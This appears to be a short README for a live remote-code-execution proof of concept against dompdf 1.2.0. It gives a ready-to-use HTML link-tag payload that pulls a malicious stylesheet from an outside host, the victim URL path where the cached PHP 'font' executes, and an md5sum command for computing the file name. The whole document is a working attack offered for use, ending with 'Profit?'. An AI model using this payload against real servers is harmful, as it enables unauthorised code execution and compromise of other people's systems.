# Live RCE POC for dompdf 1.2.0

1. Use the following <link> tag in any injectable field: 
   - `<link rel=stylesheet href='https://abhishekg999.github.io/dompdf/exploit.css'>`
2. Navigate to `http://[VICTIM_HOST]/dompdf/lib/fonts/exploitfont_normal_de7ec71473780093df11e62fab83211f.php`
3. Profit?


The hash should be correct, you can verify the hash yourself:
```console
user@console:~$ echo -n https://abhishekg999.github.io/dompdf/exploit_font.php | md5sum
de7ec71473780093df11e62fab83211f  -
```


---

Based off https://github.com/positive-security/dompdf-rce
